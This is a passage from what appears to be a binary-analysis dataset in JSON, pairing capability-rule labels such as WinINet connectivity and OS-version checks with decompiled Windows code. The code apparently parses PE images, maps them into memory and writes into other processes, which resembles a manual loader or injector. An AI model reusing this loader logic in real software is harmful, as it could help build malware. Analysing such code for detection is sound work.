      return 0x21590066;\n    }\n    iStackX24 = arg3;\n    iStackX32 = arg4;\n    iVar4 = fcn.0004cf30(&iStack312, 0x438, arg1);\n    iVar6 = iStack304;\n    if (iVar4 == 0) {\n        if ((*arg2 == 0x5a4d) && (iVar8 = *(arg2 + 0x1e),  *(iVar8 + arg2) == 0x4550)) {\n            if (((*(iVar8 + 0x5c + arg2) == 1) && (arg1 != 0)) || ((*(iVar8 + 0x5c + arg2) != 1 && (arg1 == 0)))) {\n                iVar4 = 0x21590206;\n                bVar2 = false;\n            }\n            else {\n                iVar4 = fcn.0004cd70(iStack312, acStackX16);\n                iVar6 = iStack304;\n                if (iVar4 == 0) {\n                    if (((acStackX16[0] == '\\0') || (*(iVar8 + 0x18 + arg2) != 0x20b)) &&\n                       ((acStackX16[0] != '\\0' || (*(iVar8 + 0x18 + arg2) != 0x10b)))) {\n                        uVar5 = fcn.0004d360(arg2);\n                        uStack296 = uVar5;\n                        iVar6 = fcn.00030c98(uStack296);\n                        iStack304 = iVar6;\n                        if (iVar6 == 0) {\n                            iVar4 = 0x21590004;\n                            bVar2 = false;\n                            puVar7 = puStack320;\n                        }\n                        else {\n                            fcn.0006677c(iVar6, 0, uStack296);\n                            iVar4 = fcn.0004d3d0(iVar6, arg2);\n                            if (iVar4 == 0) {\n                                if (iStack312 != 0) {\n                                    iVar4 = (*_fcn.00011150)(iStack312, 0, 0, 0, &iStack288, 0);\n                                    if (iVar4 < 0) {\n                                        bVar2 = false;\n                                        puVar7 = puStack320;\n                                        goto code_r0x00050491;\n                                    }\n                                    iVar8 = (*_fcn.000113e0)();\n                                    if (iStack288 != iVar8) {\n                                        (**0x113d8)(iStack288, auStack104);\n                                        bVar3 = true;\n                                    }\n                                }\n                                iVar8 = *(iVar6 + 0x3c) + iVar6;\n                                if (acStackX16[0] == '\\x01') {\n                                    uStack328 = *(iVar8 + 0x34);\n                                }\n                                else {\n                                    uStack328 = *(iVar8 + 0x30);\n                                }\n                                iVar4 = fcn.0004ce20(iStack312, &uStack328, &uStack296);\n                                if (iVar4 == 0) {\n                                    iVar4 = fcn.0004d278(iVar6, uStack328);\n                                    if (iVar4 == 0) {\n                                        iVar4 = fcn.0004cdec(iStack312, uStack328, iVar6, uStack296 & 0xffffffff);\n                                        puVar7 = puStack320;\n                                        if (iVar4 == 0) {\n                                            bVar2 = false;\n                                            if (arg1 != 0) {\n                                                puVar7 = fcn.00030c98(0x428);\n                                                puStack320 = puVar7;\n                                                if (puVar7 == NULL) {\n                                                    iVar4 = 0x21590004;\n                                                    bVar2 = false;\n                                                    goto code_r0x00050491;\n                                                }\n                                                *puVar7 = uStack328;\n                                                puVar7[2] = *(iVar8 + 0x28) + uStack328;\n                                                *(puVar7 + 1) = *(iVar8 + 0x50);\n                                                *(puVar7 + 0xc) = *(iVar8 + 8);\n                                                if (iStackX24 == 0) {\n                                                    *(puVar7 + 3) = 0;\n                                                }\n                                                else {\n                                                    fcn.00066740(puVar7 + 3, iStackX24, 0x104);\n                                                    *(puVar7 + 0x21e) = 0;\n                                                }\n                                                if (iStackX32 == 0) {\n                                                    *(puVar7 + 0x44) = 0;\n                                                }\n                                                else {\n                                                    fcn.00066740(puVar7 + 0x44, iStackX32, 0x104);\n                                                    *(puVar7 + 0x426) = 0;\n                                                }\n                                                iVar4 = fcn.0004edc4(arg1_00, puVar7, acStackX16);\n                                                if (iVar4 != 0) {\n                                                    bVar2 = false;\n                                                    goto code_r0x00050491;\n                                                }\n                                                bVar2 = true;\n                                            }\n                                            iVar4 = fcn.0004e350(arg1_00, iVar6);\n                                            if (iVar4 == 0) {\n                                                bVar1 = true;\n                                                iVar4 = fcn.0004cdec(iStack312, uStack328, iVar6, uStack296 & 0xffffffff\n                                                                    );\n                                                if (iVar4 == 0) {\n                                                    if (*(iVar8 + 0x28) != 0) {\n                                                        uVar5 = *(iVar8 + 0x28);\n                                                        iStack280 = 0;\n                                                        fcn.0006677c(auStack272, 0, 0x9f);\n                                                        iVar8 = uVar5 + uStack328;\n                                                        if (iVar8 == 0) {\n                                                            iVar4 = 0x21590066;\n                                                            goto code_r0x00050491;\n                                                        }\n                                                        if (uStack328 == 0) {\n                                                            iVar4 = 0x21590067;\n                                                            goto code_r0x00050491;\n                                                        }\n                                                        uStack181 = 1;\n                                                        uStack177 = uStack328;\n                                                        uStack169 = 1;\n                                                        iStack280 = iVar8;\n                                                        uStack257 = arg1;\n                                                        iVar4 = fcn.00051c70(&iStack280);\n                                                        if (iVar4 != 0) goto code_r0x00050491;\n                                                    }\n                                                    if (arg1 != 0) {\n                                                        fcn.0004dcf8(arg1_00, acStackX16);\n                                                    }\n                                                    iVar4 = 0;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            bVar2 = false;\n                                        }\n                                    }\n                                    else {\n                                        bVar2 = false;\n                                        puVar7 = puStack320;\n                                    }\n                                }\n                                else {\n                                    bVar2 = false;\n                                    puVar7 = puStack320;\n                                }\n                            }\n                            else {\n                                bVar2 = false;\n                                puVar7 = puStack320;\n                            }\n                        }\n                    }\n                    else {\n                        iVar4 = 0x21590206;\n                        bVar2 = false;\n                        puVar7 = puStack320;\n                    }\n                }\n                else {\n                    bVar2 = false;\n                }\n            }\n        }\n        else {\n            iVar4 = 0x21590065;\n            puVar7 = NULL;\n        }\n    }\ncode_r0x00050491:\n    if (iVar4 == 0) {\n        if (in_stack_00000028 != NULL) {\n            *in_stack_00000028 = uStack328;\n        }\n    }\n    else {\n        if (bVar1) {\n            fcn.00051ffc(arg1_00, uStack328);\n        }\n        else if (uStack328 != 0) {\n            if (bVar2) {\n                fcn.0004f464(arg1_00, uStack328);\n            }\n            fcn.0004cef0(iStack312, uStack328);\n        }\n        if (in_stack_00000028 != NULL) {\n            *in_stack_00000028 = 0;\n        }\n    }\n    if (iStack312 != 0) {\n        fcn.000666f2();\n    }\n    fcn.00030d24(iVar6);\n    fcn.00030d24(puVar7);\n    if (iStack288 != 0) {\n        if (bVar3) {\n            (*_fcn.000113d0)(auStack104);\n        }\n        (*_fcn.000115b8)(iStack288);\n    }\n    return iVar4;\n}\n",
        "token_count": 2212
    },
    "000509f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.000509f0(uint32_t *arg1)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    ulong *arg3;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *arg1_00;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong uVar7;\n    int16_t *piVar8;\n    int16_t *piVar9;\n    uint auStackX8 [2];\n    int64_t iStackX16;\n    int64_t iStackX24;\n    int64_t iStackX32;\n    uint64_t in_stack_ffffffffffffff20;\n    uint uVar10;\n    ulong in_stack_ffffffffffffff28;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    ulong uStack168;\n    uchar auStack160 [16];\n    uchar auStack144 [16];\n    uint auStack128 [2];\n    ulong uStack120;\n    uchar *puStack112;\n    uint uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    \n    uVar11 = in_stack_ffffffffffffff28 >> 0x20;\n    piVar8 = *(arg1 + 2);\n    uVar2 = *arg1;\n    arg3 = *(arg1 + 4);\n    arg1_00 = NULL;\n    iStackX24 = 0;\n    iStackX32 = 0;\n    iStackX16 = 0;\n    uStack168 = 0;\n    if (piVar8 == NULL) {\ncode_r0x00050ea1:\n        arg1[6] = 0x21590066;\n        return;\n    }\n    iVar5 = -1;\n    piVar4 = piVar8;\n    do {\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    if (iVar5 == -2) goto code_r0x00050ea1;\n    if (arg3 == NULL) {\n        arg1[6] = 0x21590067;\n        return;\n    }\n    *arg3 = 0;\n    piVar4 = fcn.00030c98(0x212);\n    if (piVar4 == NULL) {\n        uVar3 = 0x21590004;\n        goto code_r0x00050a7d;\n    }\n    fcn.00066740(piVar4, piVar8, 0x104);\n    piVar4[0x104] = 0;\n    iVar5 = fcn.00066764(piVar4, 0x2e);\n    if ((iVar5 == 0) || (*(iVar5 + 2) == 0x5c)) {\n        iVar5 = 0;\n        piVar8 = piVar4;\n        do {\n            iVar5 = iVar5 + -1;\n            piVar9 = piVar8;\n            if (iVar5 == 0) break;\n            piVar9 = piVar8 + 1;\n            iVar1 = *piVar8;\n            piVar8 = piVar9;\n        } while (iVar1 != 0);\n        *(piVar9 + -1) = *0x15e30;\n        piVar9[3] = *0x15e38;\n    }\n    auStackX8[0] = 0;\n    uVar3 = fcn.0004d8f0(uVar2, piVar4, 0x212, auStackX8);\n    if (uVar3 == 0) {\n        iVar5 = fcn.00066764(piVar4, 0x5c);\n        piVar8 = piVar4;\n        if (iVar5 != 0) {\n            piVar8 = iVar5 + 2;\n        }\n        uVar3 = fcn.0005057c(uVar2, piVar8, arg3);\n        if (uVar3 != 0) {\n            fcn.00066704(auStack160, piVar4);\n            puStack112 = auStack160;\n            uVar13 = 0;\n            uVar7 = CONCAT44(uVar11, 7);\n            in_stack_ffffffffffffff20 = in_stack_ffffffffffffff20 & 0xffffffff00000000;\n            uVar11 = 0;\n            uStack120 = 0;\n            uStack96 = 0;\n            uStack88 = 0;\n            auStack128[0] = 0x30;\n            uStack104 = 0x240;\n            uVar3 = fcn.0001e364(&iStackX24, 0x80000000, auStack128, auStack144, 0, in_stack_ffffffffffffff20, uVar7, 1\n                                 , 0x40, 0, 0);\n            uVar12 = uVar7 >> 0x20;\n            uVar10 = in_stack_ffffffffffffff20 >> 0x20;\n            if (uVar3 == 0) {\ncode_r0x00050d4e:\n                auStack128[0] = 0x30;\n                uStack120 = 0;\n                uStack104 = 0x200;\n                puStack112 = NULL;\n                uStack96 = 0;\n                uStack88 = 0;\n                uVar3 = fcn.00066872(&iStackX32, 0xf001f, auStack128, 0, CONCAT44(uVar11, 2), \n                                     CONCAT44(uVar10, 0x8000000), iStackX24);\n                if (uVar3 == 0) {\n                    iStackX16 = 0;\n                    uVar3 = fcn.0006686c(iStackX32, 0xffffffffffffffff, &iStackX16, 0, 0, 0, &uStack168, 2, 0, \n                                         CONCAT44(uVar13, 2));\n                    if (uVar3 == 0) {\n                        uVar3 = fcn.0004ff9c(uVar2, iStackX16, piVar8, piVar4);\n                    }\n                }\n            }\n            else {\n                arg1_00 = NULL;\n                if (piVar8 == piVar4) {\n                    arg1_00 = fcn.00030c98(0x208);\n                    if (arg1_00 == NULL) {\n                        uVar3 = 0x21590004;\n                    }\n                    else {\n                        uVar3 = fcn.0003066c(arg1_00, 0x104);\n                        if ((uVar3 == 0) && (uVar3 = fcn.0004cd24(0xffffffffffffffff, auStackX8),  uVar3 == 0)) {\n                            uVar6 = 0xffffffffffffffff;\n                            uVar7 = 0x15da8;\n                            piVar9 = arg1_00;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                iVar1 = *piVar9;\n                                piVar9 = piVar9 + 1;\n                            } while (iVar1 != 0);\n                            if (auStackX8[0] != '\\0') {\n                                uVar7 = 0x15d90;\n                            }\n                            fcn.000667ca(arg1_00, uVar7, 0x104 - (~uVar6 - 1));\n                            uVar6 = 0xffffffffffffffff;\n                            piVar9 = arg1_00;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                iVar1 = *piVar9;\n                                piVar9 = piVar9 + 1;\n                            } while (iVar1 != 0);\n                            fcn.000667ca(arg1_00, piVar4, 0x104 - (~uVar6 - 1));\n                            arg1_00[0x103] = 0;\n                            fcn.00066704(auStack160, arg1_00);\n                            uVar13 = 0;\n                            puStack112 = auStack160;\n                            in_stack_ffffffffffffff20 = in_stack_ffffffffffffff20 & 0xffffffff00000000;\n                            auStack128[0] = 0x30;\n                            uStack120 = 0;\n                            uVar11 = 0;\n                            uStack104 = 0x240;\n                            uStack96 = 0;\n                            uStack88 = 0;\n                            uVar3 = fcn.0001e364(&iStackX24, 0x80000000, auStack128, auStack144, 0, \n                                                 in_stack_ffffffffffffff20, CONCAT44(uVar12, 7), 1, 0x40, 0, 0);\n                            uVar10 = in_stack_ffffffffffffff20 >> 0x20;\n                            if (uVar3 == 0) goto code_r0x00050d4e;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.00030d24(arg1_00);\n    if (iStackX16 != 0) {\n        fcn.00066866(0xffffffffffffffff);\n    }\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    if (iStackX24 != 0) {\n        fcn.000666f2();\n    }\n    fcn.00030d24(piVar4);\ncode_r0x00050a7d:\n    arg1[6] = uVar3;\n    return;\n}\n",
        "token_count": 2138
    },
    "000513c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000513c0(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint16_t *arg2_00;\n    char cVar2;\n    int64_t *arg4_00;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t arg3_00;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    char *in_stack_00000030;\n    uint16_t in_stack_00000038;\n    unkbyte6 in_stack_0000003a;\n    int64_t *in_stack_00000040;\n    uint32_t uStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    int64_t iStack152;\n    int64_t iStack144;\n    int64_t iStack136;\n    int64_t iStack128;\n    uchar auStack120 [16];\n    int16_t iStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    \n    arg4_00 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n    arg3_00 = 0;\n    if ((((arg4_00 == NULL) || (arg2 == 0)) || (arg3 == 0)) || (in_stack_00000040 == NULL)) {\n        return 0x21590008;\n    }\n    *in_stack_00000040 = arg3;\n    puVar8 = arg2 + 0x78;\n    if (*(arg2 + 0x18) != 0x10b) {\n        puVar8 = arg2 + 0x88;\n    }\n    uVar7 = *puVar8;\n    if (uVar7 == 0) {\n        return 0x21590005;\n    }\n    iVar6 = uVar7 + puVar8[1];\n    if (arg1 == 0) {\n        fcn.0006670a(auStack120, arg3 + uVar7, 0x28);\n    }\n    else {\n        iVar3 = fcn.00030c58(arg1, arg3 + uVar7, auStack120, 0x28);\n        if (iVar3 != 0) goto code_r0x000517eb;\n    }\n    iStack152 = uStack84 + arg3;\n    iStack144 = uStack88 + arg3;\n    iStack128 = uStack92 + arg3;\n    arg3_00 = fcn.00030c98(0x104);\n    if (arg3_00 == 0) {\n        iVar3 = 0x21590004;\n        goto code_r0x000517eb;\n    }\n    if ((in_stack_00000030 & 0xffffffffffff0000) == 0) {\n        in_stack_00000038 = in_stack_00000030 - iStack104;\n        if (in_stack_00000038 <= uStack100) {\n            puVar1 = uStack92 + arg3 + in_stack_00000038 * 4;\n            if (arg1 == 0) {\n                uStack164 = *puVar1;\n            }\n            else {\n                iVar3 = fcn.00030c58(arg1, puVar1, &uStack164, 4);\n                if (iVar3 != 0) goto code_r0x000517eb;\n            }\n            if ((uStack164 < *puVar8) || (*puVar8 + puVar8[1] <= uStack164)) {\n                iVar3 = 0;\n                *arg4_00 = uStack164 + arg3;\n            }\n            else {\n                uVar7 = iVar6 - uStack164;\n                if (0x104 < uVar7) {\n                    uVar7 = 0x104;\n                }\n                iVar5 = uStack164 + arg3;\n                if (arg1 == 0) {\n                    fcn.0006670a(arg3_00, iVar5, uVar7);\n                }\n                else {\n                    iVar3 = fcn.00030c58(arg1, iVar5, arg3_00, uVar7);\n                    if (iVar3 != 0) goto code_r0x000517eb;\n                }\n                iVar3 = fcn.00051294(arg4, arg3, arg3_00, arg4_00);\n            }\n            goto code_r0x000517eb;\n        }\n    }\n    else {\n        uVar4 = 0;\n        iVar5 = -1;\n        uStack168 = 0;\n        do {\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            cVar2 = *in_stack_00000030;\n            in_stack_00000030 = in_stack_00000030 + 1;\n        } while (cVar2 != '\\0');\n        uVar7 = ~iVar5 - 1;\n        uStack156 = 0x103;\n        if (uVar7 < 0x103) {\n            uStack156 = uVar7;\n        }\n        iStack136 = uStack156;\n        if (uStack96 != 0) {\n            do {\n                arg2_00 = iStack152 + uVar4 * 2;\n                if (arg1 == 0) {\n                    in_stack_00000038 = *arg2_00;\n                }\n                else {\n                    iVar3 = fcn.00030c58(arg1, arg2_00, &stack0x00000038, 2);\n                    if (iVar3 != 0) goto code_r0x000517eb;\n                }\n                puVar1 = iStack128 + in_stack_00000038 * 4;\n                if (arg1 == 0) {\n                    uStack164 = *puVar1;\n                }\n                else {\n                    iVar3 = fcn.00030c58(arg1, puVar1, &uStack164, 4);\n                    if (iVar3 != 0) goto code_r0x000517eb;\n                }\n                puVar1 = iStack144 + uStack168 * 4;\n                if (arg1 == 0) {\n                    uStack160 = *puVar1;\n                }\n                else {\n                    iVar3 = fcn.00030c58(arg1, puVar1, &uStack160, 4);\n                    if (iVar3 != 0) goto code_r0x000517eb;\n                }\n                if (uStack156 < iVar6 - uStack160) {\n                    if (arg1 == 0) {\n                        fcn.0006670a(arg3_00);\n                    }\n                    else {\n                        iVar3 = fcn.00030c58(arg1, uStack160 + arg3, arg3_00, uStack156 + 1);\n                        if (iVar3 != 0) goto code_r0x000517eb;\n                    }\n                    if ((*(iStack136 + arg3_00) == '\\0') && (iVar3 = fcn.0006674c(),  iVar3 == 0)) {\n                        if ((uStack164 < *puVar8) || (*puVar8 + puVar8[1] <= uStack164)) {\n                            iVar3 = 0;\n                            *arg4_00 = arg3 + uStack164;\n                        }\n                        else {\n                            uVar7 = iVar6 - uStack164;\n                            if (0x104 < uVar7) {\n                                uVar7 = 0x104;\n                            }\n                            iVar5 = uStack164 + arg3;\n                            if (arg1 == 0) {\n                                fcn.0006670a(arg3_00, iVar5, uVar7);\n                            }\n                            else {\n                                iVar3 = fcn.00030c58(arg1, iVar5, arg3_00, uVar7);\n                                if (iVar3 != 0) goto code_r0x000517eb;\n                            }\n                            iVar3 = fcn.00051294(arg4, arg3, arg3_00, arg4_00);\n                        }\n                        if (uStack168 < uStack96) goto code_r0x000517eb;\n                        break;\n                    }\n                }\n                uStack168 = uStack168 + 1;\n                uVar4 = uStack168;\n            } while (uStack168 < uStack96);\n        }\n    }\n    iVar3 = 0x21590005;\ncode_r0x000517eb:\n    fcn.00030d24(arg3_00);\n    return iVar3;\n}\n",
        "token_count": 1912
    },
    "00051af8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00051af8(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong arg3;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    char acStackX8 [8];\n    int64_t iStackX16;\n    ulong uStackX24;\n    int64_t iStackX32;\n    \n    iStackX16 = 0;\n    iVar1 = fcn.0004cf30(&uStackX24, 0x47a, *(arg1 + 0x17));\n    if ((iVar1 == 0) && (iVar1 = fcn.0004cd70(uStackX24, acStackX8),  iVar1 == 0)) {\n        *(arg1 + 0x2b) = 1;\n        *(arg1 + 0xc) = acStackX8[0];\n        *(arg1 + 0x1b) = uStackX24;\n        if (acStackX8[0] == '\\0') {\n            uVar2 = 0xa5;\n            arg3 = 0x6b8d0;\n        }\n        else {\n            uVar2 = 0xfe;\n            arg3 = 0x6b7d0;\n        }\n        uVar3 = uVar2;\n        iStackX32 = uVar3 + 0x14e;\n        iVar1 = fcn.0004ce20(uStackX24, &iStackX16, &iStackX32);\n        if ((iVar1 == 0) && (iVar1 = fcn.0004cdec(uStackX24, iStackX16, arg3, uVar2),  iVar1 == 0)) {\n            *(arg1 + 0x23) = iStackX16;\n            iVar1 = fcn.00051a38(arg1);\n            if ((iVar1 == 0) && (iVar1 = fcn.0004cdec(uStackX24, uVar3 + 0xa7 + iStackX16, arg1, 0xa7),  iVar1 == 0)) {\n                *(arg1 + 0x33) = uVar3 + 0xa7 + iStackX16;\n                iVar1 = fcn.000307e0();\n                if (iVar1 < 0x1b) {\n                    iVar1 = fcn.000510e8(arg1);\n                }\n                else {\n                    iVar1 = fcn.0004d0f4(arg1);\n                }\n            }\n        }\n    }\n    if ((iStackX16 != 0) && (*(arg1 + 0x2b) != 0)) {\n        iStackX32 = 0;\n        fcn.00066908(uStackX24, &iStackX16, &iStackX32, 0x8000);\n    }\n    fcn.000666f2(uStackX24);\n    return iVar1;\n}\n",
        "token_count": 642
    },
    "00051c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00051c70(code **arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    \n    if (*(arg1 + 0x17) != 0) {\n        uVar2 = fcn.0005057c(*(arg1 + 0x17), 0x15e18, arg1 + 0xf);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        if (((*(arg1 + 99) != 0) && (*(arg1 + 0x6f) == 0)) &&\n           (uVar2 = fcn.000519cc(*(arg1 + 0x17), *(arg1 + 0xf), 0x15e60, arg1 + 0x9f),  uVar2 != 0)) {\n            return uVar2;\n        }\n    }\n    if (*(arg1 + 0x17) == 0) {\n        if (*(arg1 + 99) == 0) {\n            uVar2 = (**arg1)(*(arg1 + 0x67), *(arg1 + 0x6f));\n        }\n        else {\n            iVar1 = (**arg1)(*(arg1 + 0x67), *(arg1 + 0x6f), 0);\n            uVar2 = (iVar1 != 0) - 1;\n        }\n    }\n    else {\n        uVar2 = fcn.00051af8(arg1);\n    }\n    return uVar2;\n}\n",
        "token_count": 337
    },
    "00051df4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00051df4(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    int16_t aiStack360 [30];\n    int32_t iStack300;\n    int32_t aiStack296 [10];\n    uint32_t uStack256;\n    \n    aiStackX24[0] = 0;\n    if (*(arg1 + 2) == 0) {\n        uVar1 = 0x21590065;\n    }\n    else if (*arg1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0004eae8(*arg1, *(arg1 + 2), auStackX16);\n        if (uVar1 == 0) {\n            if (auStackX16[0] == 0) {\n                uVar1 = 0;\n            }\n            else if (auStackX16[0] == 0xffffffff) {\n                uVar1 = 0;\n            }\n            else {\n                if (auStackX16[0] != 0) {\n                    uVar1 = fcn.0004fa0c(*arg1, *(arg1 + 2));\n                    if (uVar1 != 0) goto code_r0x00051fdc;\n                }\n                if (auStackX16[0] < 2) {\n                    uVar1 = fcn.0004cf30(aiStackX24, 0x18, *arg1);\n                    if (uVar1 == 0) {\n                        uVar1 = fcn.0004cdbc(aiStackX24[0], *(arg1 + 2), aiStack360, 0x40);\n                        if (uVar1 == 0) {\n                            if (aiStack360[0] == 0x5a4d) {\n                                uVar1 = fcn.0004cdbc(aiStackX24[0], iStack300 + *(arg1 + 2), aiStack296, 0x108);\n                                if (uVar1 == 0) {\n                                    if (aiStack296[0] == 0x4550) {\n                                        fcn.000666f2();\n                                        aiStackX24[0] = 0;\n                                        if ((*(arg1 + 4) != '\\0') && (uStack256 != 0)) {\n                                            uVar1 = fcn.00051d70(*arg1, *(arg1 + 2) + uStack256, *(arg1 + 2), 0);\n                                            if (uVar1 != 0) goto code_r0x00051fdc;\n                                        }\n                                        uVar1 = fcn.0004f464(*arg1, *(arg1 + 2));\n                                        if (uVar1 == 0) {\n                                            uVar1 = fcn.000520f0(*arg1, aiStack296, *(arg1 + 2));\n                                        }\n                                    }\n                                    else {\n                                        uVar1 = 0xffffffff;\n                                    }\n                                }\n                            }\n                            else {\n                                uVar1 = 0xffffffff;\n                            }\n                        }\n                    }\n                }\n                else {\n                    uVar1 = 0;\n                }\n            }\n        }\n    }\ncode_r0x00051fdc:\n    if (aiStackX24[0] != 0) {\n        fcn.000666f2();\n    }\n    arg1[5] = uVar1;\n    return;\n}\n",
        "token_count": 762
    },
    "000520f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000520f0(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iStackX32;\n    ulong uStack344;\n    uchar auStack336 [12];\n    uint32_t uStack324;\n    char acStack312 [280];\n    \n    iStackX32 = 0;\n    iVar3 = 0;\n    if (*(arg2 + 0x18) == 0x10b) {\n        iVar3 = arg2;\n    }\n    if (iVar3 == 0) {\n        uVar1 = *(arg2 + 0x90);\n    }\n    else {\n        uVar1 = *(arg2 + 0x80);\n    }\n    iVar3 = uVar1 + arg3;\n    if (iVar3 == arg3) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.0004cf30(&iStackX32, 0x18, arg1);\n        if (iVar2 == 0) {\n            while( true ) {\n                iVar2 = fcn.0004cdbc(iStackX32, iVar3, auStack336, 0x14);\n                if (iVar2 != 0) break;\n                if (uStack324 == 0) {\n                    fcn.0004cef0(iStackX32, arg3);\n                    iVar2 = 0;\n                    break;\n                }\n                iVar2 = fcn.0004cdbc(iStackX32, arg3 + uStack324, acStack312, 0x104);\n                if (iVar2 != 0) break;\n                if (acStack312[0] != '\\0') {\n                    iVar2 = fcn.00050ebc(arg1, acStack312, &uStack344);\n                    if (iVar2 == 0) {\n                        fcn.0004fa0c(arg1, uStack344);\n                        fcn.00051ffc(arg1, uStack344);\n                    }\n                    iVar3 = iVar3 + 0x14;\n                }\n            }\n        }\n    }\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    return iVar2;\n}\n",
        "token_count": 503
    },
    "00052258": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00052258(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (arg2 == 1) {\n        uVar2 = 0x10;\n        bVar3 = *(arg1 + 0x133) == '\\x10';\n    }\n    else {\n        if (arg2 == 2) {\n            return *(arg1 + 0x133);\n        }\n        if (arg2 == 3) {\n            return (*(arg1 + 0x133) != '\\x10') + 4;\n        }\n        if (arg2 == 6) {\n            if (*(arg1 + 0x133) == 0x10) {\n                return 0x20;\n            }\n            return *(arg1 + 0x133);\n        }\n        if (arg2 != 7) {\n            return arg2;\n        }\n        uVar2 = 0x40;\n        bVar3 = *(arg1 + 0xac) == '@';\n    }\n    uVar1 = 0x20;\n    if (bVar3) {\n        uVar1 = uVar2;\n    }\n    return uVar1;\n}\n",
        "token_count": 274
    },
    "000522d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000522d0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint8_t in_R8B;\n    \n    iVar1 = fcn.00052258(arg1, arg2);\n    if (iVar1 == 4) {\ncode_r0x0005233f:\n        iVar1 = in_R8B + 0x15;\n    }\n    else {\n        if (iVar1 != 5) {\n            if (iVar1 == 8) {\n                if (((*(arg1 + 0xac) == '@') && (*(arg1 + 0x129) != '\\0')) && (3 < in_R8B)) {\n                    return in_R8B + 5;\n                }\n                return in_R8B + 1;\n            }\n            if (iVar1 == 0x10) goto code_r0x0005233f;\n            if (iVar1 != 0x20) {\n                if (iVar1 != 0x40) {\n                    return 0;\n                }\n                return in_R8B + 0x35;\n            }\n        }\n        iVar1 = in_R8B + 0x25;\n    }\n    return iVar1;\n}\n",
        "token_count": 265
    },
    "0005234c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
